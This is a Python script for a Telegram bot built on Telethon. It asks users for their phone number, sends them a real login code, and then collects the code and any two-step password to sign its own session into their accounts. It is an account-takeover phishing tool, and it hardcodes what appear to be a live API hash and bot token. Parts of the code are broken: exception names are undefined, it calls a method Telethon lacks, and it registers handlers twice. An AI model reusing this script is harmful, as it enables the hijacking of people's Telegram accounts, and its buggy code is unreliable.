



import telethon


import asyncio


from telethon import TelegramClient, events




api_id = 10247139  # Replace with your API ID
api_hash = "96b46175824223a33737657ab943fd6a"  # Replace with your API Hash
bot_token = "7293653178:AAGcJSttQbNUK0ORBmf6G9yy7LBLsxuU_k8"  # Replace with your Bot Token

client = TelegramClient('user_session', api_id, api_hash)

# Dictionary to store user data
user_data = {}

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond("Welcome! Please enter your phone number in the format +123456789.")
    raise events.StopPropagation

@client.on(events.NewMessage)
async def handle_phone_number(event):
    phone_number = event.message.message.strip()
    
    if not phone_number.startswith('+'):
        await event.respond("Please enter a valid phone number.")
        return
    
    try:
        # Send the OTP
        sent_code_info = await client.send_code_request(phone_number)
        user_data[event.sender_id] = {"phone_number": phone_number, "sent_code_info": sent_code_info}
        await event.respond("OTP sent! Please enter the code you received.")
        
        # Wait for OTP input
        @client.on(events.NewMessage)
        async def handle_otp(otp_event):
            otp_code = otp_event.message.message.strip()
            try:
                await client.sign_in(phone_number, sent_code_info.phone_code_hash, otp_code)
                await otp_event.respond("You are now logged in!")
            except SessionPasswordNeeded:
                password = await client.ask(otp_event.chat_id, "Please enter your password:")
                await client.sign_in(password=password.text)
                await otp_event.respond("You are now logged in!")
            except PhoneCodeInvalid:
                await otp_event.respond("Invalid code. Please try again.")
        
        # Start listening for OTP events
        client.add_event_handler(handle_otp, events.NewMessage)
        
    except Exception as e:
        await event.respond(f"Error sending OTP: {str(e)}")

# Run the bot
async def main():
    await client.start()
    print("Bot is running...")
    await client.run_until_disconnected()

# Start the main function
import asyncio
asyncio.run(main())
